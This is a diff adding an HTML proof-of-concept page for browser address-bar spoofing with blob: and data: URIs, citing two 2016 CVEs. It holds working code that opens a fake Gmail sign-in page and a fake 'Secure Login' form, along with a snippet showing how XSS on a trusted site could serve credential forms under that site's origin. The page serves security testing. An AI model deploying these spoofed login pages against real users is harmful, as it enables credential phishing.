@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>data:/blob: URI Spoofing PoC</title>
+<style>
+  body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3; padding: 30px; }
+  h1 { color: #f0883e; }
+  .meta { color: #8b949e; margin-bottom: 24px; font-size: 14px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 16px 0; }
+  h3 { color: #58a6ff; margin-bottom: 10px; }
+  pre { background: #0d1117; padding: 14px; border-radius: 6px; font-size: 12px; color: #c9d1d9; overflow-x: auto; }
+  .btn { padding: 10px 18px; background: #238636; color: white; border: none; border-radius: 6px;
+         cursor: pointer; font-size: 13px; margin-right: 8px; margin-top: 8px; }
+  .btn.b { background: #1f6feb; }
+  .log { background: #0d1117; border-radius: 6px; padding: 12px; margin-top: 12px; font-family: monospace; font-size: 12px; min-height: 60px; }
+  .url-box { background: #f1f3f4; color: #333; padding: 10px 14px; border-radius: 4px; font-family: monospace; font-size: 13px; margin: 8px 0; word-break: break-all; }
+</style>
+</head>
+<body>
+<h1>📄 data: / blob: URI Spoofing PoC</h1>
+<div class="meta">CVE-2016-5189 (Chrome) · CVE-2016-1940 (Firefox Android)</div>
+
+<div class="card">
+  <h3>Blob URL — Shows Parent Origin in Address Bar</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    A blob URL created from <code>https://trusted.com</code> displays as <code>blob:https://trusted.com/uuid</code>.
+    The user sees "trusted.com" — but content is 100% controlled by who created the blob.
+  </p>
+  <pre>// If you have ANY code execution on trusted.com (XSS, etc.):
+const html = '&lt;h1&gt;Attacker content&lt;/h1&gt;&lt;form&gt;Enter credentials: &lt;input&gt;&lt;/form&gt;';
+const blob = new Blob([html], {type: 'text/html'});
+const url = URL.createObjectURL(blob);
+// url = "blob:https://trusted.com/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+window.open(url); // Shows trusted.com in address bar!</pre>
+  <button class="btn" onclick="testBlob()">▶ Test Blob URL</button>
+  <div class="log" id="log1">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>data: URI — No Origin (blank address bar)</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    <code>data:</code> URIs show no domain — just the raw data URL. On mobile, this can be
+    confused for a trusted page especially if the page looks legitimate. Also used in
+    phishing bypasses when filters only check domain names.
+  </p>
+  <pre>// Navigate or open popup to data: URL
+const page = btoa('&lt;h1&gt;Fake Login&lt;/h1&gt;&lt;p&gt;Enter your password:&lt;/p&gt;');
+window.open(`data:text/html;base64,${page}`);</pre>
+  <button class="btn b" onclick="testDataURI()">▶ Test data: URI</button>
+  <div class="log" id="log2">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Browser Behavior Matrix</h3>
+  <pre style="color:#c9d1d9">BLOB URLs:
+  Chrome:           Shows "blob:https://origin/uuid" — origin visible
+  Firefox:          Shows "blob:https://origin/uuid" — origin visible
+  Edge:             Same as Chrome
+  Safari:           Same, blob: with origin
+  Status: By design — but exploitable if attacker has XSS on trusted domain
+
+DATA: URIs:
+  Chrome (desktop): Shows full data: URI — obviously weird
+  Chrome (mobile):  May show shortened version, less obvious
+  Firefox (desktop): Shows full data: URI
+  Firefox (Android): CVE-2016-1940 — could spoof with data: + address bar confusion
+  Safari (iOS):     Interesting behavior — test!
+
+JAVASCRIPT: URIs (mostly blocked but test):
+  Modern browsers: Blocked in address bar
+  Old browsers: Could navigate to javascript: showing previous URL
+  Check: what happens when clicked link uses javascript: URI?</pre>
+</div>
+
+<script>
+function log(id, msg, color) {
+  const el = document.getElementById('log' + id);
+  const c = color || '#8b949e';
+  el.innerHTML += `<span style="color:${c}">[${new Date().toLocaleTimeString()}] ${msg}</span>\n`;
+}
+
+function testBlob() {
+  const html = `<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Gmail</title></head>
+<body style="font-family:Arial,sans-serif;margin:0;background:#f5f5f5">
+  <div style="max-width:400px;margin:80px auto;background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
+    <div style="text-align:center;margin-bottom:24px">
+      <div style="font-size:48px">📧</div>
+      <h2 style="color:#202124;margin:12px 0 4px">Sign in</h2>
+      <p style="color:#5f6368;font-size:14px">to continue to Gmail</p>
+    </div>
+    <input type="email" placeholder="Email or phone" style="width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:12px;box-sizing:border-box">
+    <input type="password" placeholder="Enter your password" style="width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:20px;box-sizing:border-box">
+    <button style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer">Next</button>
+    <p style="text-align:center;margin-top:20px;font-size:12px;color:#f44336">
+      ⚠ RESEARCH DEMO: Address bar shows blob:${location.origin}/...
+    </p>
+  </div>
+</body></html>`;
+
+  const blob = new Blob([html], {type: 'text/html'});
+  const blobURL = URL.createObjectURL(blob);
+  log(1, 'Blob URL created: ' + blobURL, '#3fb950');
+  log(1, 'Origin that will be shown: ' + location.origin, '#e3b341');
+
+  const w = window.open(blobURL, '_blank');
+  if (!w) {
+    log(1, '⚠ Popup blocked. Copy URL and open manually:', '#f85149');
+    log(1, blobURL, '#58a6ff');
+  } else {
+    log(1, '✓ Opened! Check address bar — it shows origin: ' + location.origin, '#3fb950');
+    log(1, 'Full blob URL: ' + blobURL, '#8b949e');
+  }
+}
+
+function testDataURI() {
+  const content = `<html><head><meta charset="UTF-8"><title>Secure Login</title></head>
+<body style="font-family:Arial;margin:0;background:#fff;padding:40px">
+  <div style="max-width:380px;margin:0 auto;border:1px solid #ddd;border-radius:8px;padding:32px">
+    <h2 style="color:#1a73e8">🔒 Secure Login</h2>
+    <p style="color:#666;font-size:14px">data: URI — no domain shown in some browsers</p>
+    <input placeholder="Username" style="width:100%;padding:10px;margin:6px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
+    <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:6px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
+    <button style="width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px">Sign In</button>
+    <p style="font-size:11px;color:red;text-align:center;margin-top:12px">DEMO: Check what browser shows in address bar</p>
+  </div>
+</body></html>`;
+
+  const dataURL = 'data:text/html;base64,' + btoa(content);
+  log(2, 'Opening data: URI...', '#3fb950');
+  log(2, 'URL starts with: ' + dataURL.substring(0, 50) + '...', '#8b949e');
+
+  const w = window.open(dataURL, '_blank');
+  if (!w) {
+    log(2, '⚠ Popup blocked. Copy this data: URL and paste in address bar:', '#f85149');
+    log(2, dataURL.substring(0, 100) + '...', '#58a6ff');
+    navigator.clipboard.writeText(dataURL).then(() => {
+      log(2, 'Full URL copied to clipboard!', '#3fb950');
+    }).catch(() => {});
+  } else {
+    log(2, '✓ Opened! Check address bar — what does it show?', '#3fb950');
+    log(2, 'Firefox Android (old) showed blank/unclear origin = CVE-2016-1940', '#e3b341');
+  }
+}
+</script>
+</body>
+</html>
